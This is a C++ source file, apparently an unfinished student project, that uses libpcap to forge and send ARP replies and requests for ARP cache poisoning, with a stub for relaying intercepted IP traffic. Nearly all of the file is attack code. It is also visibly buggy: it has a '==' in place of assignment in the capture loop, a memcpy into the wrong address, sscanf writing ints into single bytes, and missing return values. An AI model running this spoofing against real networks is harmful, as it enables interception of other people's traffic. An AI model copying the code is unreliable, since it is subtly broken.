#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>

using namespace std;

#define PROMISCUOUS 1
#define	ETHERTYPE_ARP		0x0806
#define	ETHERTYPE_IP        0x0800


    struct ether_arp_hdr
    {
          unsigned char   	h_dest[6];	/* destination eth addr	*/
          unsigned char   	h_source[6];	/* source ether addr	*/
          unsigned short    h_proto;		/* packet type ID field	*/

          unsigned short int ar_hrd;		/* Format of hardware address.  */
          unsigned short int ar_pro;		/* Format of protocol address.  */
          unsigned char ar_hln;		/* Length of hardware address.  */
          unsigned char ar_pln;		/* Length of protocol address.  */
          unsigned short int ar_op;		/* ARP opcode (command).  */

          unsigned char __ar_sha[6];	/* Sender hardware address.  */
          unsigned char __ar_sip[4];		/* Sender IP address.  */
          unsigned char __ar_tha[6];	/* Target hardware address.  */
          unsigned char __ar_tip[4];		/* Target IP address.  */

    };

    struct ether_ip_hdr {

        unsigned char   	h_dest[6];	/* destination eth addr	*/
        unsigned char   	h_source[6];	/* source ether addr	*/
        unsigned short    h_proto;		/* packet type ID field	*/

        unsigned int ihl:4;
        unsigned int version:4;
        u_int8_t tos;
        u_int16_t tot_len;
        u_int16_t id;
        u_int16_t frag_off;
        u_int8_t ttl;
        u_int8_t protocol;
        u_int16_t check;
        u_int32_t saddr;
        u_int32_t daddr;
    };

    struct ether_arp_hdr *eth_arp_hdr;
    struct ether_ip_hdr *eth_ip_hdr;


 char change_mac(char mac[], unsigned char *packet) {

     sscanf(mac, "%x:%x:%x:%x:%x:%x", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
 }


int get_my_mac_address(char *dev, unsigned char *packet) {

     int fd;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
     if(fd < 0) {
         cout << "socket error" << endl;
         return -1;
     }

     struct ifreq ifr;
     strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
         cout << "Mac error" << endl;
         return -1;
     }

     cout << "-- Input my mac address : ";
     for(int i=0; i<6; i++) {
     cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
     packet[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
     }
}

int get_ip_address(char argv[], unsigned char *packet) {

    sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(argv);
    memcpy(&packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

}

 int arp_infaction(char *dev, char *argv[], pcap_t *pcd) {

     eth_arp_hdr = new ether_arp_hdr;

     cout << "Ethernet Destination : " << endl;
     change_mac(argv[5], eth_arp_hdr->h_dest);

     cout << "Ethernet Source : " << endl;
     get_my_mac_address(dev, eth_arp_hdr->h_source);


     // =========================================================

     // ARP data
     eth_arp_hdr->ar_hrd = htons(0x0001);
     cout << "ar_hdr : " << eth_arp_hdr->ar_hrd << endl;
     eth_arp_hdr->ar_pro = htons(0x0800);
     cout << "ar_pro : " << eth_arp_hdr->ar_pro << endl;
     eth_arp_hdr->ar_hln = 0x06;
     cout << "ar_hln : " << eth_arp_hdr->ar_hln << endl;
     eth_arp_hdr->ar_pln = 0x04;
     cout << "ar_pln : " << eth_arp_hdr->ar_pln << endl;
     eth_arp_hdr->ar_op = htons(0x0002);
     cout << "ar_op : " << eth_arp_hdr->ar_op << endl << endl;

     // =========================================================

     eth_ip_hdr = new ether_ip_hdr;

     cout << endl << "Sender ip : " << endl;
     get_ip_address(argv[2], eth_arp_hdr->__ar_sip);


     cout << "Sender mac : ";
     get_my_mac_address(dev, eth_arp_hdr->__ar_sha);


     cout << endl << "Target mac : " << endl;
     change_mac(argv[5], eth_arp_hdr->__ar_tha);

     get_ip_address(argv[3], eth_arp_hdr->__ar_tip);
     cout << "Target ip : " << eth_arp_hdr->__ar_tip;

     if (pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
         cout << "Error packet" << endl;
         return -1;
     }
     else cout << endl << endl << "Reply Good" << endl;
 }

int main(int argc, char *argv[])
{

    pcap_t *pcd; // packet captuer descripter

    if (argc != 7) {
        cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac broadcast";
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    cout << endl << "Device : " << dev << endl << endl;


    if ((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 500, errbuf)) == NULL) {
        cout << "Unable to open the Adapter.";
        return -1;
    }


    const u_char *packet;
    struct pcap_pkthdr *pkthdr;
    unsigned short ether_type;

    char target_mac[6];
    int target_ip;

    int res;


while((res == pcap_next_ex(pcd, &pkthdr, &packet))>=0) {

   // ep = (struct ethhdr *)packet;
   // ip = (struct iphdr *)packet;

    if(res == 0);
    if(res < 0) {
        cout << "Error reading the packets " << pcap_geterr(pcd);
        return -1;
    }

    eth_ip_hdr = (struct ether_ip_hdr *)packet;
    packet += sizeof(struct ethhdr *); // ip start
    ether_type = eth_ip_hdr->h_proto;


    if(ether_type == htons(ETHERTYPE_ARP)) { // infection


    }

    if(ether_type == htons(ETHERTYPE_IP)) { // relay

        // Get gateway mac address to Request

        cout << "Request Ethernet Destination : " << endl;
        change_mac(argv[6], eth_arp_hdr->h_dest);


        cout << "Request Ethernet Source : " << endl;
        get_my_mac_address(dev, eth_arp_hdr->h_source);

        // =========================================================

        // ARP data
        eth_arp_hdr->ar_hrd = htons(0x0001);
        cout << "ar_hdr : " << eth_arp_hdr->ar_hrd << endl;
        eth_arp_hdr->ar_pro = htons(0x0800);
        cout << "ar_pro : " << eth_arp_hdr->ar_pro << endl;
        eth_arp_hdr->ar_hln = 0x06;
        cout << "ar_hln : " << eth_arp_hdr->ar_hln << endl;
        eth_arp_hdr->ar_pln = 0x04;
        cout << "ar_pln : " << eth_arp_hdr->ar_pln << endl;
        eth_arp_hdr->ar_op = htons(0x0001);
        cout << "ar_op : " << eth_arp_hdr->ar_op << endl << endl;

        // =========================================================


        cout << "Sender mac : ";
        get_my_mac_address(dev, eth_arp_hdr->__ar_sha);

        cout << endl << "Sender ip : " << endl;
        get_ip_address(argv[3], eth_arp_hdr->__ar_sip);

        cout << endl << "Target mac : " << endl;
        memset(eth_arp_hdr->__ar_tha, 0, sizeof(eth_arp_hdr->__ar_tha));
        change_mac(argv[6], eth_arp_hdr->__ar_tha);

        get_ip_address(argv[2], eth_arp_hdr->__ar_tip);
        cout << "Target ip : " << eth_arp_hdr->__ar_tip;

        if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
                cout << "Error packet" << endl;
                return -1;
        }
        else cout << endl << endl << "Request Good" << endl;

    // after get gateway mac address ...



        // <----

    } // end if
} // end while
}
/*
    for(int i=0; i<6; i++) {
        target_mac[i] = ep->h_source[i]; // target mac = ethernet source mac
     //   if(target_mac[0] == eth_arp_hdr->h_source[0]) continue; // not change
    }
*/


// relay , get gateway and send ip
// target mac is gateway mac
// target ip is gateway ip
// send gateway mac and ip to



/*

    FILE *fp;
    char buff[1024];

    fp = popen("ifconfig", "r");
    if(fp == NULL) return -1;
    while(fgets(buff, sizeof(buff), fp)) { printf("--%s", buff); }
    pclose(fp);

    regex rx("HWaddr ([^ ])*");
    printf("%s", rx);

 */

